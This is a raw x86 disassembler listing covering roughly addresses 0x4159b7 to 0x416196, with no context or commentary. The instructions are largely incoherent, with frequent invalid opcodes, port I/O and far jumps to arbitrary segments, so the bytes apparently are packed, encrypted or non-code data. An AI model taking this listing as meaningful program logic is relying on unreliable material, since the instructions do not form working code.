  4159b7:	add    DWORD PTR [edx-0x6d],ebp
  4159ba:	popf   
  4159bb:	xchg   ecx,eax
  4159bc:	adc    ebp,DWORD PTR [esi+eax*1+0x4b]
  4159c0:	add    BYTE PTR [ebx],cl
  4159c2:	ins    BYTE PTR es:[edi],dx
  4159c3:	mov    dh,dh
  4159c5:	jge    0x4159fe
  4159c7:	xor    DWORD PTR [ecx-0x2d],ebx
  4159ca:	mov    esi,0x7813ec85
  4159cf:	xchg   ebx,eax
  4159d0:	sub    esp,0x3f563dd7
  4159d6:	jl     0x4159f0
  4159d8:	or     al,0x0
  4159da:	add    BYTE PTR [eax],al
  4159dc:	add    BYTE PTR [eax],al
  4159de:	sbb    esp,DWORD PTR [edx+0x60987392]
  4159e4:	xchg   esp,eax
  4159e5:	xchg   DWORD PTR [edi+ebp*4-0xe],ebx
  4159e9:	xchg   BYTE PTR [edi+esi*4],dh
  4159ec:	push   cs
  4159ed:	std    
  4159ee:	test   ebx,ebp
  4159f0:	idiv   DWORD PTR [edi]
  4159f2:	nop
  4159f3:	pusha  
  4159f4:	fwait
  4159f5:	and    DWORD PTR [esi-0x6f79792c],0xffffffdb
  4159fc:	or     cl,BYTE PTR ds:0x8aff4647
  415a02:	int3   
  415a03:	idiv   esi
  415a05:	dec    edi
  415a06:	(bad)  
  415a07:	pushf  
  415a08:	dec    eax
  415a09:	or     bh,bl
  415a0b:	xor    DWORD PTR ds:0x60b71bf,ecx
  415a11:	enter  0x81c1,0xa
  415a15:	push   0xadb14
  415a1a:	mov    esi,0xa55ffcfc
  415a1f:	fwait
  415a20:	or     al,BYTE PTR [ebx+0x310ea650]
  415a26:	inc    esi
  415a27:	add    BYTE PTR [eax],dh
  415a29:	mov    esp,ecx
  415a2b:	mov    bh,0x6
  415a2d:	sub    DWORD PTR [eax],0x1b491d14
  415a33:	mov    dl,0xea
  415a35:	fild   DWORD PTR [edx+0x202de572]
  415a3b:	jl     0x415aa9
  415a3d:	mov    edx,0x3d1fd0d
  415a42:	add    BYTE PTR [eax],al
  415a44:	add    BYTE PTR [eax],al
  415a46:	add    BYTE PTR [eax+0x6a33fdb2],dl
  415a4c:	loop   0x415a64
  415a4e:	pop    ebx
  415a50:	jb     0x415a24
  415a52:	inc    ebx
  415a53:	nop
  415a54:	in     eax,0x96
  415a56:	(bad)  
  415a57:	cmp    al,0x8e
  415a59:	cmc    
  415a5a:	call   0xcaac:0x487cb663
  415a61:	pop    eax
  415a62:	adc    DWORD PTR [eax-0x3a654f26],ebx
  415a68:	in     al,0x7d
  415a6a:	inc    eax
  415a6b:	je     0x415a2b
  415a6d:	fist   DWORD PTR [ebx-0x1ef01a9f]
  415a73:	lods   al,BYTE PTR ds:[esi]
  415a74:	in     al,0x1f
  415a76:	xchg   ebx,eax
  415a77:	inc    eax
  415a78:	pop    eax
  415a79:	adc    eax,0x7bfb9d37
  415a7e:	adc    BYTE PTR [esi+edi*4+0xc],ch
  415a82:	add    dl,BYTE PTR [ebx]
  415a84:	or     BYTE PTR [ecx-0x574ff0fb],bl
  415a8a:	mov    ss,WORD PTR [esi-0x7b]
  415a8d:	lods   al,BYTE PTR ds:[esi]
  415a8e:	mov    ?,WORD PTR [ebx-0x7a]
  415a91:	and    ecx,DWORD PTR [eax+edx*4]
  415a94:	jge    0x415b02
  415a96:	test   al,0xd7
  415a98:	sub    DWORD PTR [edi],0xd637c62e
  415a9e:	mov    bl,al
  415aa0:	jmp    0x3e6:0x5cbdac3d
  415aa7:	sbb    edi,DWORD PTR [esi-0x33]
  415aaa:	sub    eax,0x0
  415aaf:	add    BYTE PTR ds:0xe2ab9f38,bh
  415ab5:	lea    ecx,[esi]
  415ab7:	jmp    0x350f8a4f
  415abc:	xchg   ebx,eax
  415abd:	sub    ch,bh
  415abf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415ac0:	xchg   ebx,eax
  415ac1:	mov    dl,0xe3
  415ac3:	lds    esp,FWORD PTR [ebp+0x7d]
  415ac6:	cmp    DWORD PTR [esp+ebp*1],0xa21ce67c
  415acd:	jecxz  0x415abd
  415acf:	je     0x415a91
  415ad1:	jmp    0xb9e5:0xf5067e63
  415ad8:	lock jecxz 0x415ac9
  415adb:	rcr    DWORD PTR fs:[edi+0x7],cl
  415adf:	mov    eax,ds:0xe90de5f9
  415ae4:	es mov cl,0x3b
  415ae7:	sub    DWORD PTR [ecx+0x16b4caeb],ecx
  415aed:	xlat   BYTE PTR ds:[ebx]
  415aee:	pop    edx
  415aef:	lahf   
  415af0:	push   cs
  415af1:	pusha  
  415af2:	add    dl,BYTE PTR [esi-0x169b579b]
  415af8:	popa   
  415af9:	cmp    esp,edx
  415afb:	bound  eax,QWORD PTR [esi+eiz*8]
  415afe:	sbb    BYTE PTR [ecx+0x6c0ea3a1],cl
  415b04:	dec    ecx
  415b05:	scas   al,BYTE PTR es:[edi]
  415b06:	mov    ebp,DWORD PTR ds:0x95c52f97
  415b0c:	mov    DWORD PTR [ebx-0x10],ecx
  415b0f:	push   es
  415b10:	sbb    ah,BYTE PTR [ebp-0x77]
  415b13:	and    al,BYTE PTR [eax]
  415b15:	add    BYTE PTR [eax],al
  415b17:	add    BYTE PTR [eax],al
  415b19:	fild   DWORD PTR [esi]
  415b1b:	inc    eax
  415b1c:	test   eax,0x2a49b593
  415b21:	mov    ds:0xa3f54937,eax
  415b26:	pop    eax
  415b27:	cmp    al,0x43
  415b29:	and    al,0xf0
  415b2b:	imul   al
  415b2d:	xchg   ebx,eax
  415b2e:	(bad)  [edx]
  415b30:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415b31:	xchg   ebx,eax
  415b32:	mov    dl,0x83
  415b34:	add    BYTE PTR [esi+esi*4-0x22823675],al
  415b3b:	outs   dx,BYTE PTR ds:[esi]
  415b3c:	cmp    DWORD PTR [ebx+0x608000b3],edx
  415b42:	scas   eax,DWORD PTR es:[edi]
  415b43:	push   cs
  415b44:	jne    0x415b67
  415b46:	(bad)  
  415b47:	scas   al,BYTE PTR es:[edi]
  415b48:	data16 mov al,ds:0xefeb3870
  415b4e:	sub    ecx,DWORD PTR [eax+0x36]
  415b51:	ins    BYTE PTR es:[edi],dx
  415b52:	idiv   DWORD PTR [ecx+0x2a]
  415b55:	sbb    edi,0xffffff8a
  415b58:	sar    ch,cl
  415b5a:	add    ch,BYTE PTR [edi-0x6]
  415b5d:	sub    DWORD PTR [eax+ebx*1-0x71507776],esi
  415b64:	cli    
  415b65:	icebp  
  415b66:	mov    dl,0xb
  415b68:	xor    BYTE PTR [ebx-0x5a],0x7b
  415b6c:	or     DWORD PTR [edx],esi
  415b6e:	push   ds
  415b6f:	out    0x9a,al
  415b71:	mov    cl,0xae
  415b73:	push   cs
  415b74:	jmp    0x415b3d
  415b76:	xor    eax,0xb7d9e8de
  415b7b:	push   cs
  415b7c:	add    BYTE PTR [eax],al
  415b7e:	add    BYTE PTR [eax],al
  415b80:	add    BYTE PTR [eax],al
  415b82:	push   edx
  415b83:	jecxz  0x415bc2
  415b85:	leave  
  415b86:	iret   
  415b87:	aaa    
  415b88:	push   es
  415b89:	test   DWORD PTR [esi-0x3e],esi
  415b8c:	add    DWORD PTR [eax+0xa7bd4b6],eax
  415b92:	stc    
  415b93:	mov    ebx,0xe21cffef
  415b98:	cmp    eax,0x85b3a2c0
  415b9d:	iret   
  415b9e:	mov    eax,ds:0x66fff1b8
  415ba3:	fwait
  415ba4:	push   0x50fe2f89
  415ba9:	pop    ebx
  415baa:	aam    0xf8
  415bac:	add    eax,0xe22f9c00
  415bb1:	adc    DWORD PTR [eax+0x348192ef],0xffffffd0
  415bb8:	cmp    DWORD PTR [esi-0x19],edx
  415bbb:	add    edi,DWORD PTR [edx-0x7e346f03]
  415bc1:	jnp    0x415b5b
  415bc3:	gs xchg esi,eax
  415bc5:	std    
  415bc6:	nop
  415bc7:	retf   
  415bc8:	add    DWORD PTR ds:0xd962513,0x8146a3df
  415bd2:	fimul  WORD PTR [eax-0x32]
  415bd5:	inc    esp
  415bd6:	lods   al,BYTE PTR ds:[esi]
  415bd7:	out    0x94,eax
  415bd9:	std    
  415bda:	nop
  415bdb:	retf   
  415bdc:	sub    al,0x39
  415bde:	retf   0x4be7
  415be1:	stos   WORD PTR es:[edi],ax
  415be3:	xchg   edi,eax
  415be4:	out    dx,al
  415be5:	adc    eax,DWORD PTR [eax]
  415be7:	add    BYTE PTR [eax],al
  415be9:	add    BYTE PTR [eax],al
  415beb:	pop    esp
  415bec:	and    eax,0xf13a0221
  415bf1:	adc    DWORD PTR [esp+ebp*4-0x4d],0x5
  415bf6:	mov    dh,0x50
  415bf8:	push   ss
  415bf9:	int3   
  415bfa:	fistp  WORD PTR [eax+0xdbf01f9]
  415c00:	sub    bh,cl
  415c02:	pop    ss
  415c03:	bound  ebp,QWORD PTR cs:[edi]
  415c06:	and    al,0x8a
  415c08:	nop
  415c09:	das    
  415c0a:	and    al,0x84
  415c0c:	adc    BYTE PTR [ebx],cl
  415c0e:	add    BYTE PTR [ecx-0x6f8e523d],dl
  415c14:	retf   
  415c15:	sbb    eax,0xd96c413
  415c1b:	or     al,0x72
  415c1d:	or     eax,DWORD PTR [eax]
  415c1f:	nop
  415c20:	fs ret 0x2e8
  415c24:	popa   
  415c25:	or     al,0x0
  415c27:	sbb    ebx,eax
  415c29:	sub    al,0x89
  415c2b:	rcl    DWORD PTR ds:0xb2784788,0xdd
  415c32:	or     al,0xdc
  415c34:	mov    dl,0xe5
  415c36:	mov    al,BYTE PTR [eax+0x35]
  415c39:	xlat   BYTE PTR ds:[ebx]
  415c3a:	xchg   edi,eax
  415c3b:	xchg   ebp,eax
  415c3c:	outs   dx,BYTE PTR ss:[esi]
  415c3e:	add    al,0x90
  415c40:	mov    dl,0x7c
  415c42:	(bad)  
  415c43:	sub    BYTE PTR [eax+esi*1+0x16839005],al
  415c4a:	mov    edx,DWORD PTR [esi-0x36]
  415c4d:	in     eax,dx
  415c4e:	push   ss
  415c4f:	add    BYTE PTR [eax],al
  415c51:	add    BYTE PTR [eax],al
  415c53:	add    BYTE PTR [edi],bl
  415c55:	loope  0x415cd2
  415c57:	call   FWORD PTR ds:0x930fe6b2
  415c5d:	das    
  415c5e:	xor    eax,0xd4b3f900
  415c63:	mov    cl,0x6a
  415c65:	mov    dh,0x7a
  415c67:	aas    
  415c68:	mov    WORD PTR [edx-0xfe6fce5],es
  415c6e:	mov    WORD PTR [eax+0x7fe5b320],gs
  415c74:	shl    BYTE PTR [ebp-0x33],1
  415c77:	mov    cl,BYTE PTR [ebp+0x5071f2d]
  415c7d:	jb     0x415c28
  415c7f:	jmp    0x6a53:0xff99653
  415c86:	mov    cl,0xc
  415c88:	or     DWORD PTR ds:0xb2245b5d,eax
  415c8e:	in     eax,0xaa
  415c90:	dec    sp
  415c92:	in     eax,0x29
  415c94:	lahf   
  415c95:	sub    eax,0xca78dfb1
  415c9a:	bound  edx,QWORD PTR [edx]
  415c9c:	nop
  415c9d:	mov    dl,0x61
  415c9f:	(bad)  
  415ca0:	cld    
  415ca1:	mov    esi,0xc3b4406b
  415ca6:	leave  
  415ca7:	add    BYTE PTR [ebx],al
  415ca9:	stos   BYTE PTR es:[edi],al
  415caa:	jl     0x415c72
  415cac:	js     0x415cab
  415cae:	or     eax,0xe3b28c30
  415cb3:	loop   0x415cfc
  415cb5:	mov    ah,0x79
  415cb7:	out    dx,al
  415cb8:	add    BYTE PTR [eax],al
  415cba:	add    BYTE PTR [eax],al
  415cbc:	add    BYTE PTR [edx],cl
  415cbe:	icebp  
  415cbf:	in     eax,0xf8
  415cc1:	btr    DWORD PTR [esi],ecx
  415cc4:	bound  ecx,QWORD PTR [ebp-0x35]
  415cc7:	aaa    
  415cc8:	push   edi
  415cc9:	xchg   esp,eax
  415cca:	mov    dl,0x8b
  415ccc:	mov    bh,0x1e
  415cce:	retf   0xd108
  415cd1:	fcmovnb st,st(6)
  415cd3:	push   cs
  415cd4:	jmp    0x5274df3
  415cd9:	mov    ?,WORD PTR [edx-0x34b58df2]
  415cdf:	movhps QWORD PTR [edx+esi*4-0x1bc4597d],xmm2
  415ce7:	inc    ebp
  415ce8:	call   0xba91da80
  415ced:	sar    DWORD PTR [ecx-0x7d],cl
  415cf0:	test   BYTE PTR [eax+0xce909f4],ch
  415cf6:	iret   
  415cf7:	cmp    ebx,ebp
  415cf9:	xchg   ebx,eax
  415cfa:	mov    dl,0x58
  415cfc:	push   ecx
  415cfd:	jb     0x415cdf
  415cff:	or     eax,0x2a6f18e9
  415d04:	or     eax,0xeb1d2ff4
  415d09:	xchg   ebx,eax
  415d0a:	sub    DWORD PTR [edx+0xeb1d80d],edi
  415d10:	jmp    0xadc77cd7
  415d15:	(bad)  
  415d16:	mov    dh,0x68
  415d18:	lock pop ebp
  415d1a:	outs   dx,BYTE PTR ds:[esi]
  415d1b:	jmp    FWORD PTR [esi+ebx*1-0x21]
  415d1f:	out    dx,al
  415d20:	jmp    0x415d25
  415d25:	add    dl,al
  415d27:	add    DWORD PTR [ebx+0x57c76785],0x5c
  415d2e:	mov    ebp,0x20068ba
  415d33:	mov    es,WORD PTR [ebx+ecx*4-0x5f]
  415d37:	or     ebx,DWORD PTR ds:0x85b37973
  415d3d:	clc    
  415d3e:	lock (bad) 
  415d40:	sub    ah,BYTE PTR [eax]
  415d42:	jmp    0x830:0x9575f145
  415d49:	add    DWORD PTR [esi],ebp
  415d4b:	pop    edi
  415d4c:	add    DWORD PTR fs:[ecx],ebp
  415d4f:	mov    bl,0x66
  415d51:	mov    BYTE PTR [edx-0x4d],bl
  415d54:	push   cs
  415d55:	jmp    DWORD PTR [ebx+ecx*8]
  415d58:	jge    0x415d9e
  415d5a:	cmp    DWORD PTR [esi+0x1b],eax
  415d5d:	adc    al,0x3a
  415d5f:	jae    0x415d6f
  415d61:	cmp    eax,0xeb42b
  415d66:	and    BYTE PTR [edi+ebp*8-0x1],ch
  415d6a:	stc    
  415d6b:	sub    ecx,eax
  415d6d:	call   0x312252
  415d72:	cwde   
  415d73:	mov    ds:0x4601cf85,eax
  415d78:	jae    0x415d7b
  415d7a:	stc    
  415d7b:	aaa    
  415d7c:	inc    edx
  415d7d:	and    al,0x85
  415d7f:	push   cs
  415d80:	pop    edx
  415d81:	loopne 0x415d6c
  415d83:	mov    dl,0x83
  415d85:	inc    esp
  415d86:	xchg   ebp,eax
  415d87:	sar    BYTE PTR [esi],cl
  415d89:	add    DWORD PTR [eax],0x0
  415d8c:	add    BYTE PTR [eax],al
  415d8e:	add    BYTE PTR [ebx+0x45],dh
  415d91:	or     DWORD PTR [ebp+edx*4-0x66],0xffffffe6
  415d96:	lods   eax,DWORD PTR ds:[esi]
  415d97:	test   BYTE PTR [ebp-0xf],0x8a
  415d9b:	jno    0x415dcf
  415d9d:	aad    0x74
  415d9f:	xchg   ecx,eax
  415da0:	inc    ebp
  415da1:	jp     0x415dc7
  415da3:	popf   
  415da4:	sub    al,0x8
  415da6:	add    DWORD PTR [esi-0x3e],ebp
  415da9:	sub    ch,BYTE PTR [eax]
  415dab:	cld    
  415dac:	pushf  
  415dad:	or     ch,BYTE PTR [edx-0x70]
  415db0:	retf   0x24
  415db3:	(bad)  
  415db5:	das    
  415db6:	ror    BYTE PTR [ebx],1
  415db8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415db9:	mov    ds:0xacb3fb1,al
  415dbe:	mov    edx,esp
  415dc0:	out    dx,eax
  415dc1:	into   
  415dc2:	mov    DWORD PTR [eax],edi
  415dc4:	mov    ah,0xf
  415dc6:	jne    0x415e1f
  415dc8:	aad    0x53
  415dca:	out    dx,al
  415dcb:	xchg   ecx,eax
  415dcc:	retf   
  415dcd:	or     cl,BYTE PTR [ebx-0x39c15034]
  415dd3:	nop
  415dd4:	retf   
  415dd5:	dec    edx
  415dd6:	inc    edi
  415dd7:	mov    ebp,0x9fd96ef2
  415ddc:	push   edi
  415ddd:	leave  
  415dde:	add    BYTE PTR [eax-0x55ffdb35],dl
  415de4:	retf   
  415de5:	and    al,0x0
  415de7:	add    eax,0xf82beea8
  415dec:	idiv   dh
  415dee:	call   DWORD PTR [eax+0x241750]
  415df4:	add    BYTE PTR [eax],al
  415df6:	add    BYTE PTR [eax],al
  415df8:	mov    al,0x0
  415dfa:	mov    dl,0xd
  415dfc:	or     eax,0x90000b99
  415e01:	ret    
  415e02:	fidiv  DWORD PTR [edx-0x70]
  415e05:	retf   
  415e06:	and    al,0x3
  415e08:	cmp    edi,DWORD PTR [eax-0x4853ab79]
  415e0e:	test   ebp,ecx
  415e10:	mov    eax,0x90001ba9
  415e15:	dec    edi
  415e16:	retf   
  415e17:	je     0x415db7
  415e19:	cmc    
  415e1a:	rcr    DWORD PTR [ebx+0x6c],cl
  415e1d:	(bad)  
  415e1e:	call   DWORD PTR [edi+ebx*4]
  415e21:	fs das 
  415e23:	and    al,0x7e
  415e25:	cmp    ecx,DWORD PTR [eax-0x7a548bac]
  415e2b:	int    0xa8
  415e2d:	mov    dl,0x33
  415e2f:	gs (bad) 
  415e31:	fnstsw WORD PTR [ebx+0x27]
  415e34:	lods   al,BYTE PTR ds:[esi]
  415e35:	mov    esi,0xf2c2010c
  415e3a:	push   0xf865fcc3
  415e3f:	dec    ebp
  415e40:	aam    0x96
  415e42:	in     eax,dx
  415e43:	dec    ebx
  415e44:	fsub   DWORD PTR [esi-0x14]
  415e47:	dec    ebx
  415e48:	enter  0x9d67,0xbd
  415e4c:	int3   
  415e4d:	xchg   esi,eax
  415e4e:	hlt    
  415e4f:	add    al,0x39
  415e51:	add    DWORD PTR [edi-0x79],0xffffffc4
  415e55:	xchg   esi,eax
  415e56:	out    dx,eax
  415e57:	pop    es
  415e58:	ret    
  415e59:	imul   edx,DWORD PTR [edx+0x40],0x0
  415e5d:	add    BYTE PTR [eax],al
  415e5f:	add    BYTE PTR [eax],al
  415e61:	ins    BYTE PTR es:[edi],dx
  415e62:	mov    ds:0xb08079dd,al
  415e67:	in     eax,0x1d
  415e69:	xchg   esp,eax
  415e6a:	dec    eax
  415e6b:	in     eax,dx
  415e6c:	xchg   edx,eax
  415e6d:	arpl   WORD PTR [edx-0x226fb79c],cx
  415e73:	icebp  
  415e74:	or     esp,DWORD PTR [edx-0x17811a8e]
  415e7a:	ss mov esp,0xe548aa18
  415e80:	jl     0x415e43
  415e82:	sub    DWORD PTR [edx],edi
  415e84:	add    al,0x5f
  415e86:	sbb    DWORD PTR ds:0xe573ab70,0xdb6497c
  415e90:	add    al,0x90
  415e92:	mov    al,0xe5
  415e94:	sbb    BYTE PTR [esi+edx*4-0x57],0x9b
  415e99:	jecxz  0x415e5c
  415e9b:	jecxz  0x415ea0
  415e9d:	adc    al,0xf2
  415e9f:	(bad)  [edx]
  415ea1:	or     ecx,ebp
  415ea3:	pop    esp
  415ea4:	inc    edx
  415ea5:	push   ebp
  415ea6:	mov    bl,0xe5
  415ea8:	jle    0x415e85
  415eaa:	leave  
  415eab:	or     eax,0xeedd4aae
  415eb0:	imul   eax,DWORD PTR [eax-0x6d16e46a],0x231e3c36
  415eba:	fiadd  WORD PTR [edx+0x7a861c26]
  415ec0:	jmp    0xcdb39158
  415ec5:	add    BYTE PTR [eax],al
  415ec7:	add    BYTE PTR [eax],al
  415ec9:	add    BYTE PTR [esi-0x24],ah
  415ecc:	jns    0x415ebb
  415ece:	or     DWORD PTR [ebp-0x45359bf3],esi
  415ed4:	jmp    DWORD PTR [ebx-0x4e]
  415ed7:	fsub   st(6),st
  415ed9:	out    0x82,al
  415edb:	ja     0x415f30
  415edd:	cmp    BYTE PTR [ecx],dl
  415edf:	outs   dx,DWORD PTR ds:[esi]
  415ee0:	sub    al,BYTE PTR [ecx]
  415ee2:	sbb    al,0x72
  415ee4:	sbb    eax,0x402993eb
  415ee9:	sbb    DWORD PTR [edx+edi*1],ecx
  415eec:	xchg   ebx,eax
  415eed:	call   0xc2018885
  415ef2:	mov    DWORD PTR [ebp+0xd],esi
  415ef5:	jmp    0xcd6bce0a
  415efa:	sub    eax,DWORD PTR [edi]
  415efc:	(bad)  
  415efd:	jmp    0xf715:0x37cea193
  415f04:	cmp    ebx,ebp
  415f06:	xchg   ebx,eax
  415f07:	mov    dl,0xcc
  415f09:	in     eax,dx
  415f0a:	xchg   ebx,eax
  415f0b:	xor    edx,esp
  415f0d:	cmc    
  415f0e:	sahf   
  415f0f:	jg     0x415f69
  415f11:	push   ds
  415f12:	jle    0x415f8e
  415f14:	add    DWORD PTR [eax+0x92a8710],0x7d
  415f1b:	retf   0xdb6f
  415f1e:	mov    WORD PTR [edx+0x7019563b],?
  415f24:	push   cs
  415f25:	call   0xc70fbf
  415f2a:	aad    0xd3
  415f2c:	sbb    bl,BYTE PTR [ebx+0x0]
  415f2f:	add    BYTE PTR [eax],al
  415f31:	add    BYTE PTR [eax],al
  415f33:	fucom  st(6)
  415f35:	adc    BYTE PTR fs:[edx+ebp*2],dh
  415f39:	or     dl,BYTE PTR [eax+0x34]
  415f3c:	mov    ds:0x1d02182a,eax
  415f41:	out    0xcb,al
  415f43:	outs   dx,BYTE PTR ds:[esi]
  415f44:	scas   eax,DWORD PTR es:[edi]
  415f45:	push   cs
  415f46:	lea    ebx,[edi+eax*8]
  415f49:	pop    eax
  415f4a:	(bad)  
  415f4b:	jl     0x415f08
  415f4d:	sbb    al,0x40
  415f4f:	jns    0x415f83
  415f51:	pop    edx
  415f52:	and    al,0x71
  415f54:	lahf   
  415f55:	pop    eax
  415f56:	mov    esi,DWORD PTR [edx+0x6907ba37]
  415f5c:	scas   eax,DWORD PTR es:[edi]
  415f5d:	add    DWORD PTR [ebp-0x7d],0xffffffa5
  415f61:	pop    esi
  415f62:	lea    edi,[ebp-0x36]
  415f65:	adc    cl,BYTE PTR [ebx+0x7aa3df2]
  415f6b:	sub    DWORD PTR [edi-0x1d62bb7d],ebp
  415f71:	icebp  
  415f72:	je     0x415f01
  415f74:	(bad)  
  415f76:	je     0x415f05
  415f78:	loop   0x415f6b
  415f7a:	je     0x415f09
  415f7c:	into   
  415f7d:	lea    edi,ds:[ebp-0x2695a536]
  415f84:	sahf   
  415f85:	out    0x5d,al
  415f87:	popf   
  415f88:	inc    ecx
  415f89:	icebp  
  415f8a:	sub    DWORD PTR ds:0xf6f88dce,0xffffffb1
  415f91:	mov    ebp,DWORD PTR [esi-0x72f15107]
  415f97:	add    BYTE PTR [eax],al
  415f99:	add    BYTE PTR [eax],al
  415f9b:	add    BYTE PTR [ebp-0x6cafb536],ch
  415fa1:	scas   eax,DWORD PTR es:[edi]
  415fa2:	data16 test ch,ah
  415fa5:	jb     0x415fb5
  415fa7:	(bad)  
  415fa8:	mov    esp,0x90401dd2
  415fad:	leave  
  415fae:	jno    0x415f88
  415fb0:	or     eax,0x2840da0
  415fb5:	leave  
  415fb6:	or     al,BYTE PTR [eax]
  415fb8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415fb9:	add    eax,0xc950127b
  415fbe:	mov    edi,0xac990b4
  415fc3:	jae    0x415f5e
  415fc5:	sbb    al,0x9e
  415fc7:	adc    esi,eax
  415fc9:	fisttp QWORD PTR [edx+0x0]
  415fcc:	or     esp,DWORD PTR [ecx+0x43fcd987]
  415fd2:	adc    DWORD PTR [eax-0x6],ebx
  415fd5:	jecxz  0x415f74
  415fd7:	xor    edi,DWORD PTR [eax+0x5f00464c]
  415fdd:	test   DWORD PTR [edx],0x71cbd012
  415fe3:	clc    
  415fe4:	adc    eax,0x1b5916d1
  415fe9:	mov    edi,0xcbd0163e
  415fee:	adc    BYTE PTR [eax],dl
  415ff0:	add    eax,0x1d50068f
  415ff5:	mov    DWORD PTR [esi],eax
  415ff7:	push   eax
  415ff8:	daa    
  415ff9:	inc    edx
  415ffa:	jb     0x41603f
  415ffc:	nop
  415ffd:	push   edx
  415ffe:	push   es
  415fff:	push   0x0
  416001:	add    BYTE PTR [eax],al
  416003:	add    BYTE PTR [eax],al
  416005:	pop    edx
  416006:	jbe    0x416050
  416008:	adc    al,0x60
  41600a:	pop    esi
  41600b:	inc    esi
  41600c:	adc    al,0x60
  41600e:	cmp    BYTE PTR [ebp-0x38b32fcf],dh
  416014:	sbb    BYTE PTR [ecx],cl
  416016:	mov    DWORD PTR [edx],edi
  416018:	test   ax,0x4e88
  41601c:	je     0x415fd1
  41601e:	repz inc ebp
  416020:	sbb    BYTE PTR [ecx+eax*1+0x25],ah
  416024:	aaa    
  416025:	dec    edi
  416026:	xchg   ebp,eax
  416027:	push   ss
  416028:	sbb    BYTE PTR [edi-0x4e],ah
  41602b:	stos   DWORD PTR es:[edi],eax
  41602c:	mov    dl,0x86
  41602e:	jae    0x416015
  416030:	dec    edx
  416031:	nop
  416032:	mov    dl,0xed
  416034:	add    ebp,DWORD PTR [eax-0x6ffdde73]
  41603a:	das    
  41603b:	and    eax,0xe6228c17
  416040:	pushf  
  416041:	sub    BYTE PTR ds:0x6fd39b28,0xe6
  416048:	add    ebx,DWORD PTR [ecx]
  41604a:	in     eax,dx
  41604b:	sbb    al,0x3f
  41604d:	sub    dh,BYTE PTR [ebx+0x793fd5e5]
  416053:	mov    bh,0x2e
  416055:	fnstenv ds:0x7f511729
  41605b:	jl     0x415ffc
  41605d:	adc    esi,ecx
  41605f:	or     al,0x84
  416061:	ins    BYTE PTR es:[edi],dx
  416062:	dec    edx
  416063:	xchg   esp,eax
  416064:	ss mov esi,0x280d81
  41606a:	add    BYTE PTR [eax],al
  41606c:	add    BYTE PTR [eax],al
  41606e:	dec    ecx
  41606f:	mov    dl,0xe5
  416071:	push   ecx
  416072:	xchg   edx,eax
  416073:	sbb    eax,DWORD PTR [esi]
  416075:	stc    
  416076:	jnp    0x4160d6
  416078:	int    0x23
  41607a:	lock mov dl,0xe5
  41607d:	jl     0x416053
  41607f:	mov    gs,ecx
  416081:	mov    BYTE PTR [eax+0x5f],dl
  416084:	out    0x43,eax
  416086:	aaa    
  416087:	dec    ebp
  416088:	out    0x3,al
  41608a:	nop
  41608b:	dec    esp
  41608c:	mov    dh,0x8f
  41608e:	mov    ds:0x9043f4b6,eax
  416093:	adc    BYTE PTR [eax+0x25c59ff9],0x4
  41609a:	call   0x9046a6e6
  41609f:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  4160a1:	call   DWORD PTR [ebx]
  4160a3:	outs   dx,BYTE PTR ds:[esi]
  4160a4:	out    0x3,al
  4160a6:	nop
  4160a7:	retf   
  4160a8:	or     eax,0xeb28cce
  4160ad:	bound  ecx,QWORD PTR [eax+0x10b81e8e]
  4160b3:	data16 sub al,BYTE PTR [ecx]
  4160b6:	test   DWORD PTR [ebx],ebp
  4160b8:	mov    BYTE PTR [ecx-0x66],0x48
  4160bc:	out    dx,eax
  4160bd:	dec    esi
  4160be:	sub    ecx,edx
  4160c0:	mov    al,BYTE PTR [edi+edx*1-0x59]
  4160c4:	mov    al,BYTE PTR [ebp+0x6a0eb294]
  4160ca:	push   0xa9e92e8e
  4160cf:	add    BYTE PTR [ecx+0xad],0x0
  4160d6:	add    BYTE PTR [edi-0x70],ch
  4160d9:	fs jmp 0x38402ba2
  4160df:	xchg   edx,eax
  4160e0:	mov    dl,0x83
  4160e2:	xchg   ebp,eax
  4160e3:	ja     0x41609d
  4160e5:	mov    ebp,DWORD PTR ds:0xe5f13190
  4160eb:	js     0x416143
  4160ed:	out    dx,eax
  4160ee:	mov    edi,0xdb62c406
  4160f3:	shl    DWORD PTR [edx+0x6533e18b],cl
  4160f9:	pop    edi
  4160fa:	jb     0x416149
  4160fc:	sub    eax,0xa2280d5a
  416101:	shl    DWORD PTR [ebx+0x2e],cl
  416104:	sub    cl,ch
  416106:	adc    eax,0x36059c3c
  41610b:	mov    BYTE PTR [esi+eax*8],ch
  41610e:	ret    0x2a2b
  416111:	int    0xfd
  416113:	push   esp
  416114:	xchg   esi,eax
  416115:	or     DWORD PTR [esi],ebx
  416117:	cdq    
  416118:	xor    cl,ch
  41611a:	mov    al,0x1a
  41611c:	stos   BYTE PTR es:[edi],al
  41611d:	test   BYTE PTR [eax-0x1bcd8729],ch
  416123:	xchg   BYTE PTR [edx+0x7738008e],bh
  416129:	mov    bl,bl
  41612b:	in     eax,0xb0
  41612d:	push   es
  41612e:	or     ch,BYTE PTR [ebx-0x491429fc]
  416134:	repz into 
  416136:	add    al,0x41
  416138:	fnstcw WORD PTR [ebp+0x1]
  41613e:	add    BYTE PTR [eax],al
  416140:	idiv   BYTE PTR [ebx+ecx*8]
  416143:	test   BYTE PTR [eax-0x46],dh
  416146:	test   BYTE PTR es:[edx-0x46],ah
  41614a:	sub    cl,BYTE PTR [ebp-0x38c5300b]
  416150:	cmc    
  416151:	iret   
  416152:	push   cs
  416153:	add    DWORD PTR [ecx+0x278b0eb3],ebp
  416159:	fild   DWORD PTR [ebp-0xe5c8ab2]
  41615f:	jbe    0x4161ce
  416161:	cmp    ebp,esp
  416163:	stc    
  416164:	sahf   
  416165:	sub    BYTE PTR [ebx-0x192caab4],al
  41616b:	mov    edi,0x8bf1288c
  416170:	test   BYTE PTR [eax+eax*8-0x18],bl
  416174:	mov    ds:0xecffef6f,al
  416179:	lahf   
  41617a:	sub    dl,BYTE PTR [eax]
  41617c:	popa   
  41617d:	imul   DWORD PTR [eax]
  41617f:	add    DWORD PTR [ecx],ebp
  416181:	xor    dh,cl
  416183:	shld   ebp,esi,0xf1
  416187:	call   FWORD PTR [esi+0x57]
  41618a:	inc    edx
  41618b:	and    al,0x31
  41618d:	cmp    ecx,DWORD PTR [edx+ebx*2-0xf7a4cd8]
  416194:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416195:	inc    eax
  416196:	jp     0x4161df
